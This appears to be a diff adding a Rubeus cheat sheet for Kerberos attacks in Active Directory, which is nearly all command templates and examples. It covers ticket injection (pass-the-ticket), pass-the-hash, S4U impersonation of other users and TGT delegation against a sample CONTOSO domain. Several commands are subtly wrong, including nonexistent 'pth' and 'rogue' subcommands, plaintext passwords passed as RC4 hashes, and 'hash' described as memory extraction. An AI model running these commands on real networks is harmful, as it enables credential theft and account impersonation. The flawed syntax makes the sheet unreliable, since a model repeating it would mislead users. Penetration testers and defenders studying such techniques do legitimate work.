@@ -1,0 +1,129 @@
+### Rubeus Cheat Sheet
+
+#### 1. **Requesting a TGS Ticket**
+
+**Command:**
+```shell
+Rubeus.exe asktgs /user:domain\username /rc4:password /ptt /ticket:TGS_TICKET_FILE
+```
+
+**Example:**
+```shell
+Rubeus.exe asktgs /user:CONTOSO\jdoe /rc4:P@ssw0rd /ptt /ticket:C:\Tickets\jdoe_tgs.ticket
+```
+
+#### 2. **Injecting a TGS Ticket**
+
+**Command:**
+```shell
+Rubeus.exe ptt /ticket:TGS_TICKET_FILE
+```
+
+**Example:**
+```shell
+Rubeus.exe ptt /ticket:C:\Tickets\jdoe_tgs.ticket
+```
+
+#### 3. **Listing Kerberos Tickets**
+
+**Command:**
+```shell
+klist
+```
+
+**Example:**
+```shell
+klist
+```
+
+#### 4. **Requesting a TGT Ticket**
+
+**Command:**
+```shell
+Rubeus.exe asktgt /user:domain\username /rc4:password /ptt
+```
+
+**Example:**
+```shell
+Rubeus.exe asktgt /user:CONTOSO\jdoe /rc4:P@ssw0rd /ptt
+```
+
+#### 5. **Extracting Hashes from Memory**
+
+**Command:**
+```shell
+Rubeus.exe hash /user:domain\username /password:password
+```
+
+**Example:**
+```shell
+Rubeus.exe hash /user:CONTOSO\jdoe /password:P@ssw0rd
+```
+
+#### 6. **Passing the Hash**
+
+**Command:**
+```shell
+Rubeus.exe pth /user:domain\username /rc4:hash /ptt
+```
+
+**Example:**
+```shell
+Rubeus.exe pth /user:CONTOSO\jdoe /rc4:hash_value /ptt
+```
+
+#### 7. **S4U (Service for User) Delegation**
+
+**Command:**
+```shell
+Rubeus.exe s4u /user:domain\username /rc4:password /impersonateuser:targetuser /msdsspn:targetspn /ptt
+```
+
+**Example:**
+```shell
+Rubeus.exe s4u /user:CONTOSO\jdoe /rc4:P@ssw0rd /impersonateuser:CONTOSO\targetuser /msdsspn:targetspn /ptt
+```
+
+#### 8. **Rogue TGS**
+
+**Command:**
+```shell
+Rubeus.exe rogue /user:domain\username /rc4:password /tgt:TGT_TICKET_FILE /ticket:TGS_TICKET_FILE
+```
+
+**Example:**
+```shell
+Rubeus.exe rogue /user:CONTOSO\jdoe /rc4:P@ssw0rd /tgt:C:\Tickets\jdoe_tgt.ticket /ticket:C:\Tickets\jdoe_tgs.ticket
+```
+
+#### 9. **TGT Delegation**
+
+**Command:**
+```shell
+Rubeus.exe tgtdeleg /user:domain\username /rc4:password /ptt
+```
+
+**Example:**
+```shell
+Rubeus.exe tgtdeleg /user:CONTOSO\jdoe /rc4:P@ssw0rd /ptt
+```
+
+#### 10. **Renewing a TGT Ticket**
+
+**Command:**
+```shell
+Rubeus.exe renew /user:domain\username /rc4:password /ptt
+```
+
+**Example:**
+```shell
+Rubeus.exe renew /user:CONTOSO\jdoe /rc4:P@ssw0rd /ptt
+```
+
+### Things to remember
+
+- **Privilege Escalation**: Do you have admin privs?
+- **Network Configuration**: Can the target talk to the domain controller to request and validate Kerberos tickets?
+- **Ticket Lifespan**: TGS ticket can expire. If it doesn't work, try again.
+
+This cheat sheet should help you quickly reference and use Rubeus for various penetration testing tasks involving Kerberos tickets.
